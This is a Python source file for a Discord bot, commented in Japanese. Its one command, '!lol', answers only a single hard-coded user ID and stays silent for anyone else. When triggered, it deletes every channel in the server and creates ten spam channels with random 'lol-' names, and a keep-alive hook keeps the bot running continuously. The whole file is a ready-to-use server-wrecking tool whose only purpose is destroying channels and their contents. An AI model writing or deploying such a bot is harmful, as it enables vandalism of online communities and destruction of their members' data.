import discord
from discord.ext import commands
import random
import os
from keep_alive import keep_alive

# ボットの設定
intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True

bot = commands.Bot(command_prefix='!', intents=intents)

# 特定のユーザーID（あなたのDiscord ID）
ALLOWED_USER_ID = 1464850594790637569

@bot.event
async def on_ready():
    print(f'{bot.user} としてログインしました！')
    print(f'ボットID: {bot.user.id}')
    print('------')

@bot.command()
async def lol(ctx):
    # 許可されたユーザーIDかチェック（メッセージなし）
    if ctx.author.id != ALLOWED_USER_ID:
        return
    
    guild = ctx.guild
    
    try:
        # 既存の全チャンネルを削除
        for channel in guild.channels:
            try:
                await channel.delete()
                print(f"削除: {channel.name}")
            except discord.Forbidden:
                print(f"削除失敗（権限不足）: {channel.name}")
            except Exception as e:
                print(f"削除エラー: {channel.name} - {e}")
        
        # 新しいチャンネルを10個作成
        for i in range(10):
            random_number = random.randint(1000, 9999)
            channel_name = f"lol-{random_number}"
            try:
                await guild.create_text_channel(channel_name)
                print(f"作成: {channel_name}")
            except Exception as e:
                print(f"作成エラー: {channel_name} - {e}")
        
        print("処理完了！")
        
    except Exception as e:
        print(f"エラーが発生しました: {e}")

# Keep-aliveを起動（24時間稼働用）
keep_alive()

# ボットを起動（環境変数からトークンを取得）
TOKEN = os.environ.get('DISCORD_BOT_TOKEN')
if not TOKEN:
    print("エラー: DISCORD_BOT_TOKEN 環境変数が設定されていません。")
    print("Secrets タブで DISCORD_BOT_TOKEN を設定してください。")
    exit(1)

bot.run(TOKEN)
